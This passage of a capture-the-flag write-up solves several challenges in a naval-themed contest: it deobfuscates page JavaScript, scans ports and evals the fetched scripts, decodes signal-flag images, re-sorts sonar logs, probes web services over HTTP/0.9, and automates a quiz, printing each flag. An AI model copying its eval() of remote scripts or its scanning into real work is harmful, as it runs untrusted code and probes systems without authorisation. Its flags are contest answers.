  }(_0x4a7b, - 284845 + - 61445 * - 5 + - 186392 * - 1)
);
function getRandomInt(_0x12721b, _0x4bd30f) {
  var _0x3d4eac = _0x4b01,
  _0x5961d6 = {
    'zkkfn': function (_0x270e45, _0x5f59e5) {
      return _0x270e45 + _0x5f59e5;
    },
    'Asxuo': function (_0x5d654a, _0x2376b3) {
      return _0x5d654a * _0x2376b3;
    },
    'HtEjb': function (_0x51004d, _0x1f05d8) {
      return _0x51004d - _0x1f05d8;
    }
  };
  return _0x12721b = Math[_0x3d4eac(531)](_0x12721b),
  _0x4bd30f = Math[_0x3d4eac(523)](_0x4bd30f),
  Math[_0x3d4eac(523)](
    _0x5961d6[_0x3d4eac(517)](
      _0x5961d6[_0x3d4eac(526)](
        Math[_0x3d4eac(499)](),
        _0x5961d6[_0x3d4eac(522)](_0x4bd30f, _0x12721b)
      ),
      _0x12721b
    )
  );
}
function _0x4a7b() {
  var _0x4a16f3 = [
    'THyXD',
    '10MfNvVl',
    'ById',
    'lDpzQ',
    'HtEjb',
    'floor',
    'loader',
    'none',
    'Asxuo',
    'DjmmX',
    'qPofo',
    '30bFcpXC',
    'display',
    'ceil',
    'EIqZp',
    'style',
    '.png',
    '6udGmnh',
    'myImage',
    'random',
    'src',
    'Xgsvg',
    '2147101xPxNCn',
    '471JwkRMW',
    '2613564LudmVH',
    'kDzzS',
    '7652NYkmqc',
    '2626911gNaivg',
    '3004968WoozMA',
    'img/',
    'Xscqw',
    '12jxivPF',
    '51806epgxkm',
    '158706KaxUIc',
    'b1273132a4',
    'XpYtE',
    'getElement',
    'zkkfn'
  ];
  _0x4a7b = function () {
    return _0x4a16f3;
  };
  return _0x4a7b();
}
function _0x4b01(_0xa29b0e, _0x68fa8b) {
  var _0x1ae7c6 = _0x4a7b();
  return _0x4b01 = function (_0x42f0e7, _0x3bf93a) {
    _0x42f0e7 = _0x42f0e7 - (293 * - 1 + - 6427 * 1 + 7217);
    var _0x22e036 = _0x1ae7c6[_0x42f0e7];
    return _0x22e036;
  },
  _0x4b01(_0xa29b0e, _0x68fa8b);
}
setTimeout(
  function () {
    var _0x23213c = _0x4b01,
    _0x2ee1d2 = {
      'qPofo': function (_0xb1f482, _0x32c5f6, _0x12d1bb) {
        return _0xb1f482(_0x32c5f6, _0x12d1bb);
      },
      'kDzzS': _0x23213c(524),
      'DjmmX': _0x23213c(525),
      'lDpzQ': _0x23213c(514),
      'THyXD': _0x23213c(498),
      'Xgsvg': function (_0x5284ee, _0xb6da83) {
        return _0x5284ee + _0xb6da83;
      },
      'EIqZp': function (_0x3cb2cd, _0x54e4c1) {
        return _0x3cb2cd + _0x54e4c1;
      },
      'XpYtE': _0x23213c(509),
      'Xscqw': _0x23213c(534)
    };
    fn = _0x2ee1d2[_0x23213c(528)](
      getRandomInt,
      5407 * 1 + 3175 * 3 + 27 * - 553,
      9057 + 9570 + - 18623
    ),
    document[_0x23213c(516) + _0x23213c(520)](_0x2ee1d2[_0x23213c(505)]) [_0x23213c(533)][_0x23213c(530)] = _0x2ee1d2[_0x23213c(527)],
    qn = _0x2ee1d2[_0x23213c(521)],
    document[_0x23213c(516) + _0x23213c(520)](_0x2ee1d2[_0x23213c(518)]) [_0x23213c(500)] = _0x2ee1d2[_0x23213c(501)](
      _0x2ee1d2[_0x23213c(532)](_0x2ee1d2[_0x23213c(515)], fn),
      _0x2ee1d2[_0x23213c(510)]
    );
  },
  getRandomInt( - 2043 + - 4471 * 1 + 1 * 6515, 269 * 37 + - 7054 + - 4 * 723) * ( - 9711 + - 677 * - 3 + 8680)
);
```

Given the massive range and the similarity in the behavior of the web pages,
manually visiting and deciphering each one wasn't a viable approach. The
`setTimeout` function within the obfuscated javascript would only add to the
complexity if done manually.

To counteract the `setTimeout` delay, I override it to execute its callback
function instantly:
```js
global.setTimeout = (callback, time) => {
    callback();
}
```

Additionally, to sidestep the missing variables `loader`, `document`, and
`myImage`, I created dummy objects to simulate their existence:
```js
const myImage = {
    src: 'not-set'
}

const loader = {
    style: {
        display: ''
    }
}

const document = {
    getElementById(id) {
        return {
            'loader': loader,
            'myImage': myImage,
        }[id];
    }
}
```

With the preparatory steps complete, the task was to scan the entire port
range. This meant extracting the script from each web page, and subsequently
evaluating it to see any anomalies or differences.

Using `axios` for HTTP requests and `cheerio` for parsing, each port was
scanned, and the script content evaluated. This process would essentially print
the image source which the obfuscated script pointed to:
```js
const axios = require('axios');
const cheerio = require('cheerio');

const getAndExecuteScript = async (port) => {
    try {
        const url = 'http://keyword-of-the-day.cns-jv.tcc:'+port;
        const response = await axios.get(url);
        const $ = cheerio.load(response.data);

        const scriptContent = $('script').html();
        eval(scriptContent);
        console.log(`${url}/${myImage.src}`);
    } catch (error) {
        //console.error(`Error for ${url}:`, error);
    }
};

for (let port = 60000; port < 60500; port++) {
    getAndExecuteScript(port);
}
```

From the results, only one URL stood out as being distinct:
`http://keyword-of-the-day.cns-jv.tcc:60257/img/948cd06ca7.png`. Upon viewing
the image, it displayed a message stating, "For FLAG follow this URI
/948cd06ca7". Consequently, by navigating to
`http://keyword-of-the-day.cns-jv.tcc:60257/948cd06ca7`, the flag was unveiled:
`FLAG{DEIE-fiOr-pGV5-8MPc}`.

### Signal flags

> Ahoy, officer,
>
> after a reboot at 2023-10-02 11:30:18 UTC, the On-board signal flag
> recognition system (OBSF-RS) has malfunctioned. The signal flags are no more
> recognized and the only working function is to generate and save schematic
> views, which are created every time a ship in the vicinity changes its
> signaling. We need to know what the surrounding ships signaled and if we have
> missed something important.
>
> May you have fair winds and following seas!
>
> Download the schematic views.

Upon examining the challenge, it was evident that the flags corresponded to
letters and numbers, aligning with the International Code of Signals. The
visual representation can be seen on the [Wikipedia
image](https://en.wikipedia.org/wiki/International_Code_of_Signals#/media/File:ICS-flags.png).

Each flag was uniquely identified using a green marker. Distinct shapes were
used for letters and numbers. Given the manual effort needed for translation,
automation was a more feasible approach. I devised a script that achieved the
following:

1. Detect each flag's green marker in the provided schematic views.
2. Compute the [FNV hash](https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function) for the content within the marker.
3. Translate the hash into the corresponding letter or number based on the marker shape.

Though the algorithm may not boast high efficiency, it suffices for this
purpose.

To extract the signals from every image, they were processed in a chronological
order using the command:

```sh
ls -rt *.png | xargs -n1 python decode.py | tee log
```

Interpreting the signals, the boat sporting the Finnish flag conveyed a
message. It was necessary to adjust log a little bit based on the timestamp
written in the schematic. The decoded signals contained this message:
```
CNS Josef verich, are your nets ok, too? ;-)CNS Josef verich, you can improve them by RkxBR3tsVHJHLTNvWG4tYW9aTi1aNHFNfQ== !
```
On decoding the base64 encoded segment, the resultant flag was `FLAG{lTrG-3oXn-aoZN-Z4qM}`.

Below is the script that was employed:

```python
import sys
from PIL import Image

green = (0, 196, 0)

FNV32_PRIME  = 16777619
FNV32_OFFSET = 0x811c9dc5

def is_green(img, coordinates):
    return img.getpixel(coordinates) == green

def is_flag_head(img, coordinates):
    x, y = coordinates
    return (
        is_green(img, (x - 1, y)) and
        is_green(img, (x + 1, y)) and
        is_green(img, (x, y + 20)) and
        is_green(img, (x - 40, y + 10)) and
        is_green(img, (x + 40, y + 10)) and
        is_green(img, (x - 40, y + 14)) and
        is_green(img, (x + 40, y + 14))
    )

def is_number(img, coordinates):
    x, y = coordinates
    return (
        is_green(img, (x - 50, y + 35)) and
        is_green(img, (x + 50, y + 35))
    )

def is_letter(img, coordinates):
    x, y = coordinates
    return (
        is_green(img, (x - 50, y + 45)) and
        is_green(img, (x + 50, y + 45))
    )

def fnv(img, xx, yy, dx, dy):
    hval = FNV32_OFFSET
    for y in range(yy, yy+dy):
        for x in range(xx, xx+dx):
            p = img.getpixel((x, y))
            for i in range(3):
                hval = (hval * FNV32_PRIME) % 2**32
                hval = hval ^ p[i]
    return hval

numbers = {
    338713693: 0,
    3878804141: 1,
    261733519: 2,
    789928819: 3,
    183362520: 4,
    1087980467: 5,
    2505575516: 6,
    573591159: 7,
    3353705828: 8,
    3592417619: 9,
}

letters = {
    831291692: 'a',
    1171070957: 'b',
    1232166632: 'c',
    2959877522: 'd',
    3590102650: 'e',
    3015106203: 'f',

    2830067685: 'h',
    2759549353: 'i',
    3076007220: 'm',
    3396879405: 'o',
    3400893235: 'p',

    2282107565: 'r',
    2185866000: 'v',

    2716263244: 'x',
}

def detect_green_squares(image_path):
    img = Image.open(image_path)
    width, height = img.size

    first = (0, 0)

    out = ''
    for y in range(height):
        for x in range(width):
            if is_flag_head(img, (x, y)):
                if is_number(img, (x, y)):
                    h = fnv(img, x - 30, y + 20, 60, 30)
                    print(f'number {x:5} {y:5} {h:10} {numbers.get(h)}', file=sys.stderr)
                    out += str(numbers.get(h))
                elif is_letter(img, (x, y)):
                    h = fnv(img, x - 30, y + 20, 60, 50)
                    print(f'letter {x:5} {y:5} {h:10} {letters.get(h)}', file=sys.stderr)
                    out += str(letters.get(h))
                else:
                    print('unknown', (x, y), file=sys.stderr)
                first = (x, y)
    return out

out = detect_green_squares(sys.argv[1])
if out[0] == '0' and out[1] == 'x':
    print(f'O: {sys.argv[1]} {out} {bytes.fromhex(out[2:]).decode("ascii")}')
else:
    print(f'E: {sys.argv[1]} {out}')
```

## Crew drills

### Sonar logs

> Ahoy, officer,
>
> each crew member must be able to operate the sonar and understand its logs.
> Your task is to analyze the given log file, and check out what the sonar has
> seen.
>
> May you have fair winds and following seas!
>
> Download the logs.

Upon receiving the sonar logs, it became apparent that there were entries with
timestamps from different time zones:
```
2023-10-01 22:51:22 Pacific/Honolulu - Transmitters activated
2023-10-02 00:32:51 US/Pacific - Receiver 5 up
2023-10-02 00:33:45 America/Vancouver - Preprocessor up
2023-10-02 00:52:22 America/Creston - Object detected in depth 65 (0x41)
2023-10-02 01:30:48 America/Belize - Power generator up
2023-10-02 01:34:28 America/Inuvik - Graphical UI up
2023-10-02 01:34:59 America/Mazatlan - Transmitters activated
2023-10-02 01:42:58 Mexico/BajaSur - Transmitters activated
2023-10-02 01:49:54 US/Pacific - Object detected in depth 114 (0x72)
...
```
These entries needed to be reordered to provide a consistent timeline.

To achieve this, I crafted a Python script, `convert.py`, which employed the
`pytz` library to manage timezone conversions. The objective was to localize
each timestamp in the log to its respective timezone and then convert it to a
Unix timestamp for easy sorting.

Here's the script used for conversion:
```python
import pytz
from datetime import datetime

with open('sonar.log') as f:
    for line in f:
        data = line.strip().split()
        dt = datetime.strptime(f'{data[0]} {data[1]}', "%Y-%m-%d %H:%M:%S")
        tz = pytz.timezone(data[2])
        dt = tz.localize(dt)
        print(int(dt.timestamp()), ' '.join(data[3:]))
```

This script processes each log entry and outputs the Unix timestamp followed by
the message.

Subsequently, I piped this output to a series of commands designed to sort the
log entries in chronological order and extract hexadecimal values, which seemed
to be components of the flag.

The command used was:
```sh
python convert.py | sort -n | grep -o '0x[a-f0-9][a-f0-9]' | cut -c3-
```

However, the initial output looked abnormal. Around this time, a hint surfaced
regarding the use of an older `pytz` version. By downgrading to version
`2021.3`, the script finally yielded the coherent flag:
`FLAG{3YAG-2rbj-KWoZ-LwWm}`.

### Regular cube

> Ahoy, officer
>
> knowledge of regular expressions is crucial for all sailors from CNS fleet. A
> 3D crossword puzzle is available to enhance this skill.
>
> May you have fair winds and following seas!
>
> Download the regular cube crossword.

I solved it by hand. The flag: `FLAG{NICE-NAVY-BLUE-CUBE}`.

### Web protocols

> Ahoy, officer,
>
> almost all interfaces of the ship's systems are web-based, so we will focus
> the exercise on the relevant protocols. Your task is to identify all webs on
> given server, communicate with them properly and assembly the control string
> from responses.
>
> May you have fair winds and following seas!
>
> The webs are running on server web-protocols.cns-jv.tcc.

To understand the workings of the ship's web-based interfaces, the mission was
to identify and communicate with all the webs on a given server and then
assemble a control string from the responses.

Starting with a port scan using `nmap`, I identify five open ports: 5009, 5011,
5020, 8011, and 8020.

- Ports 5011 and 8011 were similar in nature, with a slight difference in the
  type of server presenting the web page. Both responded with the cookie value
  `Set-Cookie: SESSION=LXJ2YnEtYWJJ;`.

- Ports 5020 and 8020 also shared similarities. The key difference here was
  that port 8020 utilized HTTPS. Both ports returned the cookie value
  `Set-Cookie: SESSION=Ui00MzNBfQ==;`.

Port 5009 posed a unique challenge. I tried several web protocols like
`HTTP/2`, `HTTP/3`, and websockets without any success. The breakthrough came
with a rather unconventional approach: by trying out the early version
`HTTP/0.9`.
```sh
echo -e 'GET / HTTP/0.9\r\n\r\n' | ncat web-protocols.cns-jv.tcc 5009
```
This led to the discovery of the last pice `SESSION=RkxBR3trckx0;`.

Having gathered these responses, I stitched them together to form the string:
```
RkxBR3trckx0LXJ2YnEtYWJJUi00MzNBfQ==
```
This Base64-encoded string was then decoded to unveil the final key:
`FLAG{krLt-rvbq-abIR-433A}`.

### Apha-Zulu quiz

> Ahoy, officer
>
> your task is to pass a test that is part of the crew drill. Because of your
> rank of third officer, you must lead the crew by example and pass the test
> without a single mistake.
>
> May you have fair winds and following seas!
>
> The quiz webpage is available at http://quiz.cns-jv.tcc.

In the given challenge, participants were directed to a quiz webpage,
http://quiz.cns-jv.tcc. Here, 20 questions awaited them. A notable point was
that each question had an associated `<input>` tag with an `id` attribute named
`question_id`. This `id` was instrumental in identifying individual questions.

Observing the repeated nature of the questions, it became apparent that there
was a set answer for each. Thus, automating the task was the logical next step.
I crafted a simple python script:
```python
import base64
import requests

from bs4 import BeautifulSoup

def _url(url):
    return 'http://quiz.cns-jv.tcc' + url

def inputs2dict(inputs):
    d = {}
    for tag in inputs:
        k = tag.get('name')
        if k == 'answer':
            k = tag.get('id')
        d[k] = tag.get('value')
    return d

answers = {
    'q1': 'PHP serialized object',
    'q2': 'MD5 sum',
    'q3': 'SHA1 sum',
    'q4': 'Wordpress hash',
    'q5': 'Base64 encoded data',
    'q6': 'Base32 encoded data',
    'q7': 'Encoded PowerShell command',
    'q8': 'UTF-16 Little Endian encoded data',
    'q9': 'Java Serialized data',
    'q10': 'Java Serialized hex stream',
    'q11': 'GZip hex stream',
    'q12': 'ZIP archive',
    'q13': 'ELF binary',
    'q14': 'Microsoft Windows executable binary',
    'q15': 'Linux x86 Shellcode',
    'q16': 'JSON Web Token',
    'q17': 'Microsoft EVTX file signature',
    'q18': '.NET ViewState value',
    'q19': 'XOR obfuscated string',
    'q20': 'UNIX timestamp',
}

response = requests.get(_url('/'))

for i in range(1000):
    print(response.content)

    soup = BeautifulSoup(response.content, 'html.parser')
    pre = soup.find('pre').text
    print(pre)
    inputs = inputs2dict(soup.find_all('input'))
    print(inputs)

    question = inputs['question_id']
    print(f'answer for question {question} is {answers.get(question)}')

    response = requests.post(_url('/answer'),
        cookies = response.cookies,
        data = {
            'question_id': question,
            'answer': answers[question],
            'submit': 'Submit',
            'csrf_token': inputs['csrf_token'],
        }
    )
```

The script streamlines process, it handles the HTTP requests and automatically
answers each question as they appear.

After successfully providing answers for all 20 questions, the flag appears in
the web page. A quick command extracts it:
```sh
python solve.py | sed '/FLAG{/q'
```

The obtained flag is: `FLAG{QOn7-MdEo-9cuH-aP6X}`.
